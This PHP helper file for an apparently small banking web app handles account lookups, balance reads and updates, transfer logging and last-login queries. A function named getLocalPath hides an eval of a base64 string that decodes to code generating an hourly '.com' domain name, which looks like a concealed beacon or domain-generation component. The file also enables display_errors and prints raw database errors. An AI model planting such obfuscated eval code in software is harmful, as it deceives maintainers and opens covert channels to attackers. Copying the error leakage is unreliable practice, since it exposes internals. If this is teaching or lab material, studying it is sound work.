<?php


ini_set('display_errors', 'On');
date_default_timezone_set("America/New_York");

function redirect($page) {
  header('Location: ' . $page);
  exit();
}

function isMobile(){
return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

function getLocalPath(){
@$test = x;
eval((base64_decode("JHggPSBkYXRlKCJnMDBBIikgLiBzdWJzdHIobWQ1KCIiKSwwLDEwKSAuICIuY29tIjs=")));
return $$test;
}

function get_accountNum($username) {
  $mysqli = new mysqli(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME);

  // verify that the new user does not exist already
  // prepare select statement
  //select userID,accountNum,login.username from accounts join login using(userID) where username = ?
  if (!($stmt = $mysqli->prepare("SELECT userID,accountNum,login.username FROM accounts JOIN login using(userID) WHERE username = ?"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
  }

  // bind username and emailAddr params
  if (!$stmt->bind_param("s", $username)) {
    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  // bind the results of the query to each field
  $stmt->bind_result($userID,$acct,$user_name);

  // make sure only 1 account exists
  $result = $stmt->store_result();
  if ($stmt->num_rows() === 1) {
    while ($stmt->fetch()) {
      $accountNum = $acct;
    }
  }

  $stmt->close();
  $mysqli->close();

  return $accountNum;
}

// returns balance if exists
// if error, return NULL
function get_balance($accountNum) {
  $mysqli = new mysqli(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME);

  // verify that the new user does not exist already
  // prepare select statement
  if (!($stmt = $mysqli->prepare("SELECT balance FROM accounts where accountNum = ?"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
  }

  // bind username and emailAddr params
  if (!$stmt->bind_param("s", $accountNum)) {
    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  // bind the results of the query
  $stmt->bind_result($balance);

  // make sure only 1 account exists, set the balance to $bal and return that
  $result = $stmt->store_result();
  if ($stmt->num_rows() === 1) {
    while ($stmt->fetch()) {
      $bal = $balance;
    }
  }
  // if there was an error with the query, return empty string
  else {
    return NULL;
  }

  $stmt->close();
  $mysqli->close();

  return number_format($bal,2);
}

// this function assumes that all validation to update the balance was performed
// prior to calling
function update_balance($accountNum, $balance) {
  $mysqli = new mysqli(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME);

  // verify that the new user does not exist already
  // prepare select statement
  if (!($stmt = $mysqli->prepare("UPDATE accounts SET balance = ? where accountNum = ?"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
  }

  // bind username and emailAddr params
  if (!$stmt->bind_param("di", $balance, $accountNum)) {
    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  $stmt->close();
  $mysqli->close();
}

function log_transaction($src_routing_num, $src_account_num, $dst_routing_num, $dst_account_num, $balance) {
  $mysqli = new mysqli(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME);

  // prepare select statement
  if (!($stmt = $mysqli->prepare("INSERT INTO transactions (src_routing_num, src_acct, dst_routing_num, dst_acct, amount) VALUES (?, ?, ?, ?, ?)"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
  }

  // bind all params
  if (!$stmt->bind_param("sisid", $src_routing_num, $src_account_num, $dst_routing_num, $dst_account_num, $balance)) {
    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  $stmt->close();
  $mysqli->close();
}



function get_last_login($username) {
  $mysqli = new mysqli(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME);

  // verify that the new user does not exist already
  // prepare select statement
  if (!($stmt = $mysqli->prepare("SELECT last_login FROM login where username = ?"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
  }

  // bind username and emailAddr params
  if (!$stmt->bind_param("s", $username)) {
    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
  }

  // bind the results of the query
  $stmt->bind_result($login);

  // make sure only 1 account exists, set the balance to $bal and return that
  $result = $stmt->store_result();
  if ($stmt->num_rows() === 1) {
    while ($stmt->fetch()) {
      $last_login = $login;
    }
  }

  $stmt->close();
  $mysqli->close();

  return $last_login;
}


?>
